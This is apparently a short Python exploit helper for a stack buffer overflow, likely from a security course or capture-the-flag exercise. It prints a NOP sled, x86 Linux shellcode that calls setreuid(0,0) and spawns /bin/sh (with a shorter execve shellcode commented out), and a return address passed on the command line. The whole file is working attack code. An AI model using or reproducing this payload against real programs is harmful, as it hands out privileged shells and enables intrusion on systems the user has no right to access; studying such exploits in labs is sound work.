#!/usr/bin/python3
import string
import sys # reverse byte order of passed addr

out = ''
# NOP Sled
out += '\x90'*90

# shellcode 23 bytes
# out += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

# shellcode 46 bytes 
out += '\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68'

# return value
retaddr=''.join(list(sys.argv[1]))
out += retaddr

print(out)
